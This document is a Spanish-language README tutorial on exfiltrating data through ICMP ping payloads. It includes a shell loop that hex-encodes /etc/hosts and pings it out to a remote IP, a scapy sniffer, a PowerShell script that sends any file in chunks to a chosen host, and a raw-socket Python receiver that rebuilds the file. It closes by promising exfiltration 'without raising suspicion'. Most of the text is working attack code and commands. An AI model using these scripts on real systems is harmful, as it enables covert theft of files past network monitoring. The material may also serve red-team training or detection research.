# ICMP-Exfil

# 📡 Exfiltración de Datos mediante ICMP

Este documento explora la técnica de exfiltración de datos mediante paquetes ICMP, utilizando herramientas como `tshark`, `ping`, `xxd` y scripts en Python y PowerShell.

---

## 📌 Conversión de Datos a Hexadecimal
![Pasted image 20250119202558](https://github.com/user-attachments/assets/34075ca9-cb8e-4ea8-8be8-e5e4be240440)


Convertimos una cadena de texto en su representación hexadecimal con:

```bash
echo -n "hola mundo" | xxd -p
```

📌 Usamos `-n` para evitar el salto de línea y `-p` para obtener solo la cadena en hexadecimal.

---

## 🛠️ Escucha de Tráfico ICMP con `tshark`

```bash
tshark -i lo -Y "icmp" -T fields -e data.data 2>/dev/null
```

---

## 📡 Envío de Datos mediante `ping`

Ejecutamos un ping con una carga útil en hexadecimal:

```bash
ping -c 1 192.168.1.149 -p 686f6c61206d756e646f
```

📌 El payload se pasa en formato hexadecimal.

---

## 🔄 Decodificación de la Respuesta
![Pasted image 20250119203418](https://github.com/user-attachments/assets/638d4da3-fbb6-41e6-ace4-00f217c24783)

```bash
echo "756e646f686f6c61206d756e646f686f6c61206d..." | xxd -ps -r
```

📌 Se convierte la respuesta hexadecimal de vuelta a texto.

---

## 📦 Fragmentación de Paquetes

Convertimos el contenido de `/etc/hosts` a hexadecimal en fragmentos de 4 bytes:

```bash
cat /etc/hosts | xxd -p -c 4 | while read line; do ping -c1 192.168.1.149 -p $line; done
```

---

## 🤖 Automatización con Python

### `Sniffer.py`

```python
#!/usr/bin/env python3
from scapy.all import *
import signal, sys

def def_handler(sig, frame):
    print("\n[!] Saliendo del Programa")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def data_parser(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:
        data = packet[ICMP].load[-4:].decode("utf-8")
        print(data, end='', flush=True)

if __name__ == "__main__":
    sniff(iface="lo", prn=data_parser)
```

---

## ⚡ Ping Funcional con Decodificación

```bash
cat /etc/hosts | xxd -p -c 4 | while read line; do ping -c 1 127.0.0.1 -s 4 -p "$line"; done
```

Capturamos los paquetes:

```bash
tshark -i lo -Y "icmp" -T fields -e data.data > data.txt
```

Decodificamos los datos:

```bash
awk 'NR % 2 == 1' data.txt | xxd -ps -r
```

---

## 🖥️ Script de Exfiltración en PowerShell

### `ICMP-Sender.ps1`

```powershell
param (
    [string]$IPAddress,
    [string]$inFile
)

$ICMPClient = New-Object System.Net.NetworkInformation.Ping
$PingOptions = New-Object System.Net.NetworkInformation.PingOptions
$PingOptions.DontFragment = $true
[int]$bufSize = 1472

if (-not (Test-Path $inFile)) {
    Write-Error "El archivo especificado no existe: $inFile"
    exit 1
}

$stream = [System.IO.File]::OpenRead($inFile)
$chunkNum = 0
$TotalChunks = [math]::floor($stream.Length / $bufSize)
$barr = New-Object byte[] $bufSize

$sendbytes = ([text.encoding]::ASCII).GetBytes("BOFAwesomefile.txt")
$ICMPClient.Send($IPAddress, 10, $sendbytes, $PingOptions) | Out-Null

while ($bytesRead = $stream.Read($barr, 0, $bufSize)) {
    $ICMPClient.Send($IPAddress, 10, $barr, $PingOptions) | Out-Null
    Start-Sleep -Seconds 1
    Write-Output "Hecho con $chunkNum de $TotalChunks fragmentos."
    $chunkNum++
}

$sendbytes = ([text.encoding]::ASCII).GetBytes("EOF")
$ICMPClient.Send($IPAddress, 10, $sendbytes, $PingOptions) | Out-Null
$stream.Dispose()

Write-Output "Transferencia del archivo completada."
```

---

## 🎯 Recepción de Datos con Python

```python
import socket

def listen():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
    with open('archivoExfiltrado.txt','wb') as catch:
        print("Iniciado el servidor de exfiltración ICMP...")
        while True:
            data, addr = s.recvfrom(1508)
            if b'BOF' in data:
                continue
            if b'EOF' in data:
                catch.write(data[-1472:-4])
                break
            catch.write(data[-1472:])
    print("Archivo recibido!")

listen()
```

---

## 📷 Capturas de Pantalla

1️- Escuchando paquetes con `tshark`
![Pasted image 20250124171832](https://github.com/user-attachments/assets/877a633e-d0e0-48c4-a576-2b920038049c)

2️- Enviando paquetes ICMP con el script PowerShell
![Pasted image 20250124172451](https://github.com/user-attachments/assets/fb08a12f-a0c7-4196-a140-75a199399e8e)
![Pasted image 20250124172621](https://github.com/user-attachments/assets/760c2279-a543-4a0d-96d6-dd0d50832871)
![Pasted image 20250124172727](https://github.com/user-attachments/assets/939fc008-103b-4f99-957f-f2bd9543c61a)

3️- Recibiendo y reconstruyendo el archivo
![Pasted image 20250124172923](https://github.com/user-attachments/assets/b7b0ac02-bbb3-4397-8a21-a371ad122703)

4️- Archivo exfiltrado correctamente
![Pasted image 20250124173108](https://github.com/user-attachments/assets/5bcbae13-fe90-4196-bc9f-f04c9870ced2)

📌 ¡Listo! Ahora puedes exfiltrar archivos a través de ICMP sin levantar sospechas 🚀
